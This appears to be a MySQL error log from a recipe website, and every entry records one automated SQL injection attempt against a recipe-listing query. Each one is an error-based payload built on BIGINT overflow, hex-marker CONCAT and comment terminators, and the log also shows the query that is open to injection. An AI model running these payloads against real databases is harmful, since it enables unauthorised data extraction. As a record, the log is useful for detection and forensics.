+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''||(SELECT 'iMxS' FROM DUAL WHERE 3473=3473 OR (SELECT 2*(IF((SELECT * FROM (SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'||(SELECT 'iMxS' FROM DUAL WHERE 3473=3473 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))))||'=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" WHERE 7828=7828 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(S' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" WHERE 7828=7828 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- NHIh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' WHERE 6651=6651 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(S' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' WHERE 6651=6651 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- dZhB=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") WHERE 9126=9126 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") WHERE 9126=9126 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- NWln=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:58
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') WHERE 7501=7501 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') WHERE 7501=7501 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- XGwW=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "duyL" LIKE "duyL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(51' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("UDxF" LIKE "UDxF=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(516' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("VDwA" LIKE "VDwA=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("ZNYj" LIKE "ZNYj=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND "thhv"="thhv=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(51' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4"))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((("JfqV"="JfqV=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(516' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (("cLaD"="cLaD=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ("EYrv"="EYrv=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'eRWE' LIKE 'eRWE=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(51' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((('xPml' LIKE 'xPml=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(516' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (('eVui' LIKE 'eVui=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('BNFN' LIKE 'BNFN=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'KmbB'='KmbB=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(51' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4'))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((('YRfL'='YRfL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(516' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (('ahOa'='ahOa=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('pGrs'='pGrs=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4" OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- xEng=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- wyvV=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- dUGI=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`) WHERE 5510=5510 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4`) WHERE 5510=5510 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- eCVx=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '` WHERE 6620=6620 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(S' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4` WHERE 6620=6620 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ynCM=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AS xKiz WHERE 5091=5091 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) AS xKiz WHERE 5091=5091 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- UtLI=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS NvnD WHERE 4382=4382 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a6' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) AS NvnD WHERE 4382=4382 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- CivQ=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 3295=3295 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 WHERE 3295=3295 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- TyZE=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 7646=7646 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SEL' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) WHERE 7646=7646 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- IuQd=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))# WGyi=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- dvMh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((6601=6601=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4)) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((6878=6878=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:48
+SQLSTATE[22003]: Numeric value out of range: 1690 BIGINT value is out of range in '(2 * if((select `s`.`CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((5167 = 5167),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78)`) `s`),8446744073709551610,8446744073709551610))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610))) AND (3511=3511=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:48
+SQLSTATE[22003]: Numeric value out of range: 1690 BIGINT value is out of range in '(2 * if((select `s`.`CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78)` from (select concat(0x716a627871,(select elt((5167 = 5167),1)),0x717a766b71,0x78) AS `CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78)`) `s`),8446744073709551610,8446744073709551610))'
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(5167=5167,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- zsms=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))#=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '") AS BBrv WHERE 3952=3952 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4") AS BBrv WHERE 3952=3952 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- Aaxh=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') AS AggM WHERE 9681=9681 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4') AS AggM WHERE 9681=9681 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- JqYL=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '")) AS IOMS WHERE 3422=3422 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4")) AS IOMS WHERE 3422=3422 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- ZqEl=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')) AS ejCS WHERE 6614=6614 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71' at line 1
+Raw SQL : SELECT * FROM data_set, file_set, class_set WHERE d_class1='recipe' AND d_class2=c_id AND (d_class2=? || 4')) AS ejCS WHERE 6614=6614 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627871,(SELECT (ELT(2993=2993,1))),0x717a766b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- YOai=0) AND d_id=file_d_id AND file_type='recipeCover' AND d_active=1 ORDER BY d_date DESC
+
+Time : 06:48:46
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''+(SELECT 'gwjT' WHERE 5468=5468 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT' at line 1
